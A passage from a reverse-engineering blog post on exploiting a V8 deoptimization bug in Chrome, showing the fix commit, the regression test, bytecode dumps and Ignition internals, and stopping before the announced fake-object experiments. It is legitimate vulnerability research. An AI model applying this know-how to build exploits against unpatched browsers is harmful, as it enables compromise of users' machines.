<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Modern attacks on the Chrome browser : optimizations and deoptimizations</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="Axel '0vercl0k' Souchet">
    <link rel="stylesheet" href="../../../../../theme/css/bootstrap.min.css" type="text/css" />
    <style type="text/css">
      body {
        padding-top: 60px;
        padding-bottom: 40px;
      }
      .sidebar-nav {
        padding: 9px 0;
      }
      .tag-1 {
        font-size: 13pt;
      }
      .tag-2 {
        font-size: 10pt;
      }
      .tag-2 {
        font-size: 8pt;
      }
      .tag-4 {
        font-size: 6pt;
     }
    </style>
    <link href="../../../../../theme/css/bootstrap-responsive.min.css" rel="stylesheet" />
    <link href="../../../../../theme/css/font-awesome.css" rel="stylesheet" />
    <link href="../../../../../theme/css/pygments.css" rel="stylesheet" />

    <!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link href="../../../../../feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer ATOM Feed" />
    <link href="../../../../../feeds/rss.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer RSS Feed" />

  </head>

  <body>

    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container-fluid">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a class="brand" href="../../../../../index.html">Diary of a reverse-engineer </a>
          <div class="nav-collapse">
            <ul class="nav">
              <ul class="nav">
                    <li><a href="../../../../../archives.html"><i class="icon-th-list"></i>Archives</a></li>
              </ul>

                <li >
                    <a href="../../../../../category/debugging.html">
                      <i class="icon-folder-open icon-large"></i>debugging
                    </a>
                </li>
                <li class="active">
                    <a href="../../../../../category/exploitation.html">
                      <i class="icon-folder-open icon-large"></i>exploitation
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/misc.html">
                      <i class="icon-folder-open icon-large"></i>misc
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/obfuscation.html">
                      <i class="icon-folder-open icon-large"></i>obfuscation
                    </a>
                </li>
                <li >
                    <a href="../../../../../category/reverse-engineering.html">
                      <i class="icon-folder-open icon-large"></i>reverse-engineering
                    </a>
                </li>

                <li><a href="../../../../../pages/about.html">About</a></li>
                <li><a href="../../../../../pages/presentations.html">Presentations</a></li>

            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container-fluid">
      <div class="row">
        <div class="span9" id="content">
<section id="content">
        <article>
                <header>
                        <h1>
                                <a href=""
                                        rel="bookmark"
                                        title="Permalink to Modern attacks on the Chrome browser : optimizations and deoptimizations">
                                        Modern attacks on the Chrome browser : optimizations and deoptimizations
                                </a>
                        </h1>
                </header>
                <div class="entry-content">
                <div class="well">
<footer class="post-info">
<span class="label">Date</span>
<abbr class="published" title="2020-10-11T00:00:00-07:00">
        <i class="icon-calendar"></i>Sun 11 October 2020
</abbr>
<span class="label">By</span>
<a href="../../../../../author/jeremy-__x86-fetiveau.html"><i class="icon-user"></i>Jeremy "@__x86" Fetiveau</a>
<span class="label">Category</span>
<a href="../../../../../category/exploitation.html"><i class="icon-folder-open"></i>exploitation</a>


<span class="label">Tags</span>
	<a href="../../../../../tag/chrome.html"><i class="icon-tag"></i>chrome</a>
	<a href="../../../../../tag/v8.html"><i class="icon-tag"></i>v8</a>
	<a href="../../../../../tag/turbofan.html"><i class="icon-tag"></i>turbofan</a>
	<a href="../../../../../tag/exploitation.html"><i class="icon-tag"></i>exploitation</a>
</footer><!-- /.post-info -->                </div>
                <h2 id="introduction">Introduction</h2>


<p>Late 2019, I presented at an internal Azimuth Security conference some work on hacking Chrome through it's JavaScript engine. </p>
<p>One of the topics I've been playing with at that time was deoptimization and so I discussed, among others, vulnerabilities in the deoptimizer. For my talk at <a href="https://www.infiltratecon.com/conference/briefings/attacking-chrome-in-2020-a-journey-through-v8s-optimizing-compiler.html">InfiltrateCon 2020</a> in Miami I was planning to discuss several components of V8. One of them was the deoptimizer. But as you all know, things didn't quite go as expected this year and the event has been postponed several times. </p>
<p>This blog post is actually an internal write-up I made for Azimuth Security a year ago and we decided to finally release it publicly.</p>
<p>Also, if you want to get serious about breaking browsers and feel like joining us, we're currently looking for experienced hackers (US/AU/UK/FR or anywhere else remotely). Feel free to reach out on <a href="https://twitter.com/__x86">twitter</a> or by <a href="mailto:jf@[company][dot]com">e-mail</a>.</p>
<p>Special thanks to the legendary <a href="https://twitter.com/mdowd">Mark Dowd</a> and <a href="https://twitter.com/hzon">John McDonald</a> for letting me publish this here.</p>


<p>For those unfamiliar with TurboFan, you may want to read an <a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">Introduction to TurboFan</a> first. Also, <a href="https://benediktmeurer.de/publications/">Benedikt Meurer</a> gave a lot of very interesting talks that are strongly recommended to anyone interested in better understanding V8's internals.</p>
<div class="toc"><span class="toctitle">Table of contents:</span><ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#motivation">Motivation</a><ul>
<li><a href="#the-commit">The commit</a></li>
<li><a href="#long-story-short">Long story short</a></li>
</ul>
</li>
<li><a href="#internals">Internals</a><ul>
<li><a href="#ignition">Ignition</a><ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#ignition-handlers">Ignition handlers</a></li>
<li><a href="#debugging">Debugging</a></li>
</ul>
</li>
<li><a href="#simplified-lowering">Simplified lowering</a><ul>
<li><a href="#propagating-truncations">Propagating truncations</a></li>
<li><a href="#retyping">Retyping</a></li>
<li><a href="#lowering-and-inserting-conversions">Lowering and inserting conversions</a></li>
</ul>
</li>
<li><a href="#a-high-level-overview-of-deoptimization">A high level overview of deoptimization</a><ul>
<li><a href="#tracing-a-deoptimization">Tracing a deoptimization</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#case-study-an-incorrect-bigint-rematerialization">Case study : an incorrect BigInt rematerialization</a><ul>
<li><a href="#back-to-simplified-lowering">Back to simplified lowering</a></li>
<li><a href="#experiment-1-reading-an-arbitrary-heap-number">Experiment 1 - reading an arbitrary heap number</a></li>
<li><a href="#experiment-2-getting-an-arbitrary-object-reference">Experiment 2 - getting an arbitrary object reference</a></li>
<li><a href="#variants">Variants</a></li>
<li><a href="#digression-on-pointer-compression">Digression on pointer compression</a></li>
</ul>
</li>
<li><a href="#conclusion">Conclusion</a></li>
<li><a href="#references">References</a><ul>
<li><a href="#technical-documents">Technical documents</a></li>
<li><a href="#bugs">Bugs</a></li>
</ul>
</li>
</ul>
</div>
<h2 id="motivation">Motivation</h2>
<h3 id="the-commit">The commit</h3>
<p>To understand <a href="https://chromium-review.googlesource.com/c/v8/v8/+/1873692">this security bug</a>, it is necessary to delve into V8's internals.</p>
<p>Let's start with what the commit says: </p>
<div class="highlight"><pre><span></span><code>Fixes word64-lowered BigInt in FrameState accumulator

Bug: chromium:1016450
Change-Id: I4801b5ffb0ebea92067aa5de37e11a4e75dcd3c0
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/1873692
Reviewed-by: Georg Neis &lt;neis@chromium.org&gt;
Commit-Queue: Nico Hartmann &lt;nicohartmann@chromium.org&gt;
Cr-Commit-Position: refs/heads/master@{#64469}
</code></pre></div>

<p>It fixes <code>VisitFrameState</code> and <code>VisitStateValues</code> in <code>src/compiler/simplified-lowering.cc</code>.</p>
<div class="highlight"><pre><span></span><code><span class="gh">diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc</span>
<span class="gh">index 2e8f40f..abbdae3 100644</span>
<span class="gd">--- a/src/compiler/simplified-lowering.cc</span>
<span class="gi">+++ b/src/compiler/simplified-lowering.cc</span>
<span class="gu">@@ -1197,7 +1197,7 @@</span>
         // TODO(nicohartmann): Remove, once the deoptimizer can rematerialize
         // truncated BigInts.
         if (TypeOf(input).Is(Type::BigInt())) {
<span class="gd">-          ProcessInput(node, i, UseInfo::AnyTagged());</span>
<span class="gi">+          ConvertInput(node, i, UseInfo::AnyTagged());</span>
         }

         (*types)[i] =
<span class="gu">@@ -1220,11 +1220,22 @@</span>
     // Accumulator is a special flower - we need to remember its type in
     // a singleton typed-state-values node (as if it was a singleton
     // state-values node).
<span class="gi">+    Node* accumulator = node-&gt;InputAt(2);</span>
     if (propagate()) {
<span class="gd">-      EnqueueInput(node, 2, UseInfo::Any());</span>
<span class="gi">+      // TODO(nicohartmann): Remove, once the deoptimizer can rematerialize</span>
<span class="gi">+      // truncated BigInts.</span>
<span class="gi">+      if (TypeOf(accumulator).Is(Type::BigInt())) {</span>
<span class="gi">+        EnqueueInput(node, 2, UseInfo::AnyTagged());</span>
<span class="gi">+      } else {</span>
<span class="gi">+        EnqueueInput(node, 2, UseInfo::Any());</span>
<span class="gi">+      }</span>
     } else if (lower()) {
<span class="gi">+      // TODO(nicohartmann): Remove, once the deoptimizer can rematerialize</span>
<span class="gi">+      // truncated BigInts.</span>
<span class="gi">+      if (TypeOf(accumulator).Is(Type::BigInt())) {</span>
<span class="gi">+        ConvertInput(node, 2, UseInfo::AnyTagged());</span>
<span class="gi">+      }</span>
       Zone* zone = jsgraph_-&gt;zone();
<span class="gd">-      Node* accumulator = node-&gt;InputAt(2);</span>
       if (accumulator == jsgraph_-&gt;OptimizedOutConstant()) {
         node-&gt;ReplaceInput(2, jsgraph_-&gt;SingleDeadTypedStateValues());
       } else {
<span class="gu">@@ -1237,7 +1248,7 @@</span>
         node-&gt;ReplaceInput(
             2, jsgraph_-&gt;graph()-&gt;NewNode(jsgraph_-&gt;common()-&gt;TypedStateValues(
                                               types, SparseInputMask::Dense()),
<span class="gd">-                                          accumulator));</span>
<span class="gi">+                                          node-&gt;InputAt(2)));</span>
       }
     }
</code></pre></div>

<p>This can be linked to <a href="https://chromium-review.googlesource.com/c/v8/v8/+/1876057">a different commit</a> that adds a related regression test: </p>
<div class="highlight"><pre><span></span><code>Regression test for word64-lowered BigInt accumulator

This issue was fixed in https://chromium-review.googlesource.com/c/v8/v8/+/1873692

Bug: chromium:1016450
Change-Id: I56e1c504ae6876283568a88a9aa7d24af3ba6474
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/1876057
Commit-Queue: Nico Hartmann &lt;nicohartmann@chromium.org&gt;
Auto-Submit: Nico Hartmann &lt;nicohartmann@chromium.org&gt;
Reviewed-by: Jakob Gruber &lt;jgruber@chromium.org&gt;
Reviewed-by: Georg Neis &lt;neis@chromium.org&gt;
Cr-Commit-Position: refs/heads/master@{#64738}
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="c1">// Copyright 2019 the V8 project authors. All rights reserved.</span>
<span class="c1">// Use of this source code is governed by a BSD-style license that can be</span>
<span class="c1">// found in the LICENSE file.</span>

<span class="c1">// Flags: --allow-natives-syntax --opt --no-always-opt</span>

<span class="kd">let</span> <span class="nx">g</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">.</span><span class="nx">asUintN</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="mi">15</span><span class="nx">n</span><span class="p">);</span>
  <span class="c1">// Introduce a side effect to force the construction of a FrameState that</span>
  <span class="c1">// captures the value of y.</span>
  <span class="nx">g</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">x</span> <span class="o">+</span> <span class="nx">y</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">y</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>


<span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
<span class="nx">assertEquals</span><span class="p">(</span><span class="mi">16</span><span class="nx">n</span><span class="p">,</span> <span class="nx">f</span><span class="p">(</span><span class="mi">1</span><span class="nx">n</span><span class="p">));</span>
<span class="nx">assertEquals</span><span class="p">(</span><span class="mi">17</span><span class="nx">n</span><span class="p">,</span> <span class="nx">f</span><span class="p">(</span><span class="mi">2</span><span class="nx">n</span><span class="p">));</span>
<span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
<span class="nx">assertEquals</span><span class="p">(</span><span class="mi">16</span><span class="nx">n</span><span class="p">,</span> <span class="nx">f</span><span class="p">(</span><span class="mi">1</span><span class="nx">n</span><span class="p">));</span>
<span class="nx">assertOptimized</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
<span class="nx">assertEquals</span><span class="p">(</span><span class="mi">15</span><span class="nx">n</span><span class="p">,</span> <span class="nx">f</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
<span class="nx">assertUnoptimized</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
</code></pre></div>

<h3 id="long-story-short">Long story short</h3>
<p>This vulnerability consists in a bug in the way the simplified lowering phase of TurboFan deals with <code>FrameState</code> and <code>StateValues</code> nodes. Those nodes are related to deoptimization. </p>
<p>During the code generation phase, using those nodes, TurboFan builds deoptimization input data that are used when the runtime bails out to the deoptimizer (it mispeculated a type for example).</p>
<p>Because after a deoptimizaton execution goes from optimized native code back to interpreted bytecode, the deoptimizer needs to know where to deoptimize to (ex: which bytecode offset?) and how to build a correct frame (ex: what ignition registers?). To do that, the deoptimizer uses the deoptimization input data built during code generation.</p>
<p>Using this bug, it is possible to make code generation incorrectly build deoptimization input data so that the deoptimizer materializes a fake object. Then, it redirects the execution to an ignition bytecode handler that has an arbitrary object pointer referenced by its accumulator register.</p>
<h2 id="internals">Internals</h2>
<p>To understand this bug, we want to know: </p>
<ul>
<li>what is ignition (because we deoptimize back to ignition)</li>
<li>what is simplified lowering (because that's where the bug is)</li>
<li>what is a deoptimization (because it is impacted by the bug and will materialize a fake object for us)</li>
</ul>
<h3 id="ignition">Ignition</h3>
<h4 id="overview">Overview</h4>
<p>V8 features an interpreter called Ignition. It uses TurboFan's macro-assembler. This assembler is architecture-independent and TurboFan is responsible for compiling these instructions down to the target architecture.</p>
<p>Ignition is a register machine. That means opcode's inputs and output are using only registers. There is an accumulator used as an implicit operand for many opcodes.</p>
<p>For every opcode, an associated handler is generated. Therefore, executing bytecode is mostly a matter of fetching the current opcode and dispatching it to the correct handler.</p>
<p>Let's observe the bytecode for a simple JavaScript function.</p>
<div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">opt_me</span> <span class="o">=</span> <span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
  <span class="kd">let</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">val</span> <span class="o">+</span> <span class="mi">42</span><span class="p">;</span>
  <span class="nx">o</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
<span class="nx">opt_me</span><span class="p">({</span><span class="nx">x</span><span class="o">:</span><span class="mf">1.1</span><span class="p">});</span>
</code></pre></div>

<p>Using the <code>--print-bytecode</code> and <code>--print-bytecode-filter=opt_me</code> flags we can dump the corresponding generated bytecode.</p>
<div class="highlight"><pre><span></span><code>Parameter count 3
Register count 1
Frame size 8
   13 E&gt; 0000017DE515F366 @    0 : a5                StackCheck
   41 S&gt; 0000017DE515F367 @    1 : 25 02             Ldar a1
   45 E&gt; 0000017DE515F369 @    3 : 40 2a 00          AddSmi [42], [0]
         0000017DE515F36C @    6 : 26 fb             Star r0
   53 S&gt; 0000017DE515F36E @    8 : 25 fb             Ldar r0
   57 E&gt; 0000017DE515F370 @   10 : 2d 03 00 01       StaNamedProperty a0, [0], [1]
         0000017DE515F374 @   14 : 0d                LdaUndefined
   67 S&gt; 0000017DE515F375 @   15 : a9                Return
Constant pool (size = 1)
0000017DE515F319: [FixedArray] in OldSpace
 - map: 0x00d580740789 &lt;Map&gt;
 - length: 1
           0: 0x017de515eff9 &lt;String[#1]: x&gt;
Handler Table (size = 0)
</code></pre></div>

<p>Disassembling the function shows that the low level code is merely a trampoline to the interpreter entry point. In our case, running an x64 build, that means the trampoline jumps to the code generated by <code>Builtins::Generate_InterpreterEntryTrampoline</code> in <code>src/builtins/x64/builtins-x64.cc</code>.</p>
<div class="highlight"><pre><span></span><code>d8&gt; %DisassembleFunction(opt_me)
0000008C6B5043C1: [Code]
 - map: 0x02ebfe8409b9 &lt;Map&gt;
kind = BUILTIN
name = InterpreterEntryTrampoline
compiler = unknown
address = 0000004B05BFE830

Trampoline (size = 13)
0000008C6B504400     0  49ba80da52b0fd7f0000 REX.W movq r10,00007FFDB052DA80  (InterpreterEntryTrampoline)
0000008C6B50440A     a  41ffe2         jmp r10
</code></pre></div>

<p>This code simply fetches the instructions from the function's <code>BytecodeArray</code> and executes the corresponding ignition handler from a dispatch table.</p>
<div class="highlight"><pre><span></span><code>d8&gt; %DebugPrint(opt_me)
DebugPrint: 000000FD8C6CA819: [Function]
// ...
 - code: 0x01524c1c43c1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;
 - interpreted
 - bytecode: 0x01b76929f331 &lt;BytecodeArray[16]&gt;
// ...
</code></pre></div>

<p>Below is the part of <code>Builtins::Generate_InterpreterEntryTrampoline</code> that loads the address of the dispatch table into the <code>kInterpreterDispatchTableRegister</code>. Then it selects the current opcode using the <code>kInterpreterBytecodeOffsetRegister</code> and <code>kInterpreterBytecodeArrayRegister</code>. Finally, it computes <code>kJavaScriptCallCodeStartRegister = dispatch_table[bytecode * pointer_size]</code> and then calls the handler. Those registers are described in <code>src\codegen\x64\register-x64.h</code>.</p>
<div class="highlight"><pre><span></span><code>  <span class="c1">// Load the dispatch table into a register and dispatch to the bytecode</span>
  <span class="c1">// handler at the current bytecode offset.</span>
  <span class="n">Label</span> <span class="n">do_dispatch</span><span class="p">;</span>
  <span class="n">__</span> <span class="nf">bind</span><span class="p">(</span><span class="o">&amp;</span><span class="n">do_dispatch</span><span class="p">);</span>
  <span class="n">__</span> <span class="nf">Move</span><span class="p">(</span>
      <span class="n">kInterpreterDispatchTableRegister</span><span class="p">,</span>
      <span class="n">ExternalReference</span><span class="o">::</span><span class="n">interpreter_dispatch_table_address</span><span class="p">(</span><span class="n">masm</span><span class="o">-&gt;</span><span class="n">isolate</span><span class="p">()));</span>
  <span class="n">__</span> <span class="nf">movzxbq</span><span class="p">(</span><span class="n">r11</span><span class="p">,</span> <span class="n">Operand</span><span class="p">(</span><span class="n">kInterpreterBytecodeArrayRegister</span><span class="p">,</span>
                          <span class="n">kInterpreterBytecodeOffsetRegister</span><span class="p">,</span> <span class="n">times_1</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
  <span class="n">__</span> <span class="nf">movq</span><span class="p">(</span><span class="n">kJavaScriptCallCodeStartRegister</span><span class="p">,</span>
          <span class="n">Operand</span><span class="p">(</span><span class="n">kInterpreterDispatchTableRegister</span><span class="p">,</span> <span class="n">r11</span><span class="p">,</span>
                  <span class="n">times_system_pointer_size</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
  <span class="n">__</span> <span class="nf">call</span><span class="p">(</span><span class="n">kJavaScriptCallCodeStartRegister</span><span class="p">);</span>
  <span class="n">masm</span><span class="o">-&gt;</span><span class="n">isolate</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">heap</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">SetInterpreterEntryReturnPCOffset</span><span class="p">(</span><span class="n">masm</span><span class="o">-&gt;</span><span class="n">pc_offset</span><span class="p">());</span>

  <span class="c1">// Any returns to the entry trampoline are either due to the return bytecode</span>
  <span class="c1">// or the interpreter tail calling a builtin and then a dispatch.</span>

  <span class="c1">// Get bytecode array and bytecode offset from the stack frame.</span>
  <span class="n">__</span> <span class="nf">movq</span><span class="p">(</span><span class="n">kInterpreterBytecodeArrayRegister</span><span class="p">,</span>
          <span class="n">Operand</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="n">InterpreterFrameConstants</span><span class="o">::</span><span class="n">kBytecodeArrayFromFp</span><span class="p">));</span>
  <span class="n">__</span> <span class="nf">movq</span><span class="p">(</span><span class="n">kInterpreterBytecodeOffsetRegister</span><span class="p">,</span>
          <span class="n">Operand</span><span class="p">(</span><span class="n">rbp</span><span class="p">,</span> <span class="n">InterpreterFrameConstants</span><span class="o">::</span><span class="n">kBytecodeOffsetFromFp</span><span class="p">));</span>
  <span class="n">__</span> <span class="nf">SmiUntag</span><span class="p">(</span><span class="n">kInterpreterBytecodeOffsetRegister</span><span class="p">,</span>
              <span class="n">kInterpreterBytecodeOffsetRegister</span><span class="p">);</span>

  <span class="c1">// Either return, or advance to the next bytecode and dispatch.</span>
  <span class="n">Label</span> <span class="n">do_return</span><span class="p">;</span>
  <span class="n">__</span> <span class="nf">movzxbq</span><span class="p">(</span><span class="n">rbx</span><span class="p">,</span> <span class="n">Operand</span><span class="p">(</span><span class="n">kInterpreterBytecodeArrayRegister</span><span class="p">,</span>
                          <span class="n">kInterpreterBytecodeOffsetRegister</span><span class="p">,</span> <span class="n">times_1</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
  <span class="n">AdvanceBytecodeOffsetOrReturn</span><span class="p">(</span><span class="n">masm</span><span class="p">,</span> <span class="n">kInterpreterBytecodeArrayRegister</span><span class="p">,</span>
                                <span class="n">kInterpreterBytecodeOffsetRegister</span><span class="p">,</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">rcx</span><span class="p">,</span>
                                <span class="o">&amp;</span><span class="n">do_return</span><span class="p">);</span>
  <span class="n">__</span> <span class="nf">jmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">do_dispatch</span><span class="p">);</span>
</code></pre></div>

<h4 id="ignition-handlers">Ignition handlers</h4>
<p>Ignitions handlers are implemented in <code>src/interpreter/interpreter-generator.cc</code>. They are declared using the <code>IGNITION_HANDLER</code> macro. Let's look at a few examples.</p>
<p>Below is the implementation of <code>JumpIfTrue</code>. The careful reader will notice that it is actually similar to the <code>Code Stub Assembler</code> code (used to implement some of the builtins).</p>
<div class="highlight"><pre><span></span><code><span class="c1">// JumpIfTrue &lt;imm&gt;</span>
<span class="c1">//</span>
<span class="c1">// Jump by the number of bytes represented by an immediate operand if the</span>
<span class="c1">// accumulator contains true. This only works for boolean inputs, and</span>
<span class="c1">// will misbehave if passed arbitrary input values.</span>
<span class="n">IGNITION_HANDLER</span><span class="p">(</span><span class="n">JumpIfTrue</span><span class="p">,</span> <span class="n">InterpreterAssembler</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Node</span><span class="o">*</span> <span class="n">accumulator</span> <span class="o">=</span> <span class="n">GetAccumulator</span><span class="p">();</span>
  <span class="n">Node</span><span class="o">*</span> <span class="n">relative_jump</span> <span class="o">=</span> <span class="n">BytecodeOperandUImmWord</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">CSA_ASSERT</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">TaggedIsNotSmi</span><span class="p">(</span><span class="n">accumulator</span><span class="p">));</span>
  <span class="n">CSA_ASSERT</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">IsBoolean</span><span class="p">(</span><span class="n">accumulator</span><span class="p">));</span>
  <span class="n">JumpIfWordEqual</span><span class="p">(</span><span class="n">accumulator</span><span class="p">,</span> <span class="n">TrueConstant</span><span class="p">(),</span> <span class="n">relative_jump</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>Binary instructions making use of <code>inline caching</code> actually execute code implemented in <code>src/ic/binary-op-assembler.cc</code>.</p>
<div class="highlight"><pre><span></span><code><span class="c1">// AddSmi &lt;imm&gt;</span>
<span class="c1">//</span>
<span class="c1">// Adds an immediate value &lt;imm&gt; to the value in the accumulator.</span>
<span class="n">IGNITION_HANDLER</span><span class="p">(</span><span class="n">AddSmi</span><span class="p">,</span> <span class="n">InterpreterBinaryOpAssembler</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">BinaryOpSmiWithFeedback</span><span class="p">(</span><span class="o">&amp;</span><span class="n">BinaryOpAssembler</span><span class="o">::</span><span class="n">Generate_AddWithFeedback</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">BinaryOpWithFeedback</span><span class="p">(</span><span class="n">BinaryOpGenerator</span> <span class="n">generator</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">lhs</span> <span class="o">=</span> <span class="n">LoadRegisterAtOperandIndex</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">rhs</span> <span class="o">=</span> <span class="n">GetAccumulator</span><span class="p">();</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">context</span> <span class="o">=</span> <span class="n">GetContext</span><span class="p">();</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">slot_index</span> <span class="o">=</span> <span class="n">BytecodeOperandIdx</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">maybe_feedback_vector</span> <span class="o">=</span> <span class="n">LoadFeedbackVector</span><span class="p">();</span>

    <span class="n">BinaryOpAssembler</span> <span class="n">binop_asm</span><span class="p">(</span><span class="n">state</span><span class="p">());</span>
    <span class="n">Node</span><span class="o">*</span> <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">binop_asm</span><span class="p">.</span><span class="o">*</span><span class="n">generator</span><span class="p">)(</span><span class="n">context</span><span class="p">,</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">,</span> <span class="n">slot_index</span><span class="p">,</span>
                                          <span class="n">maybe_feedback_vector</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
    <span class="n">SetAccumulator</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
    <span class="n">Dispatch</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>

<p>From this code, we understand that when executing <code>AddSmi [42], [0]</code>, V8 ends-up executing code generated by <code>BinaryOpAssembler::Generate_AddWithFeedback</code>.
The left hand side of the addition is the operand 0 (<code>[42]</code> in this case), the right hand side is loaded from the accumulator register. It also loads a slot from the feedback vector using the index specified in operand 1. The result of the addition is stored in the accumulator.</p>
<blockquote>
<p>It is interesting to point out to observe the call to <code>Dispatch</code>. We may expect that every handler is called from within the <code>do_dispatch</code> label of <code>InterpreterEntryTrampoline</code> whereas actually the current ignition handler may do the dispatch itself (and thus does not directly go back to the do_dispatch)</p>
</blockquote>
<h4 id="debugging">Debugging</h4>
<p>There is a built-in feature for debugging ignition bytecode that you can enable by switching <code>v8_enable_trace_ignition</code> to true and recompile the engine. You may also want to change <code>v8_enable_trace_feedbacks</code>.</p>
<p>This unlocks some interesting flags in the d8 shell such as: </p>
<ul>
<li>--trace-ignition</li>
<li>--trace_feedback_updates</li>
</ul>
<p>There are also a few interesting runtime functions: </p>
<ul>
<li>Runtime_InterpreterTraceBytecodeEntry<ul>
<li>prints ignition registers before executing an opcode</li>
</ul>
</li>
<li>Runtime_InterpreterTraceBytecodeExit<ul>
<li>prints ignition registers after executing an opcode</li>
</ul>
</li>
<li>Runtime_InterpreterTraceUpdateFeedback<ul>
<li>displays updates to the feedback vector slots</li>
</ul>
</li>
</ul>
<p>Let's try debugging a simple <code>add</code> function.</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span> <span class="nx">add</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">a</span> <span class="o">+</span> <span class="nx">b</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>We can now see a dump of ignition registers at every step of the execution using <code>--trace-ignition</code>.</p>
<div class="highlight"><pre><span></span><code>      [          r1 -&gt; 0x193680a1f8e9 &lt;JSFunction add (sfi = 0x193680a1f759)&gt; ]
      [          r2 -&gt; 0x3ede813004a9 &lt;undefined&gt; ]
      [          r3 -&gt; 42 ]
      [          r4 -&gt; 1 ]
 -&gt; 0x193680a1fa56 @    0 : a5                StackCheck 
 -&gt; 0x193680a1fa57 @    1 : 25 02             Ldar a1
      [          a1 -&gt; 1 ]
      [ accumulator &lt;- 1 ]
 -&gt; 0x193680a1fa59 @    3 : 34 03 00          Add a0, [0]
      [ accumulator -&gt; 1 ]
      [          a0 -&gt; 42 ]
      [ accumulator &lt;- 43 ]
 -&gt; 0x193680a1fa5c @    6 : a9                Return 
      [ accumulator -&gt; 43 ]
 -&gt; 0x193680a1f83a @   36 : 26 fb             Star r0
      [ accumulator -&gt; 43 ]
      [          r0 &lt;- 43 ]
 -&gt; 0x193680a1f83c @   38 : a9                Return 
      [ accumulator -&gt; 43 ]
</code></pre></div>

<h3 id="simplified-lowering">Simplified lowering</h3>
<p>Simplified lowering is actually divided into three main phases : </p>
<ol>
<li>The truncation propagation phase (<code>RunTruncationPropagationPhase</code>)<ul>
<li><em>backward propagation of truncations</em></li>
</ul>
</li>
<li>The type propagation phase (<code>RunTypePropagationPhase</code>)<ul>
<li><em>forward propagation of types from type feedback</em></li>
</ul>
</li>
<li>The lowering phase (<code>Run</code>, after calling the previous phases)<ul>
<li>may lower nodes</li>
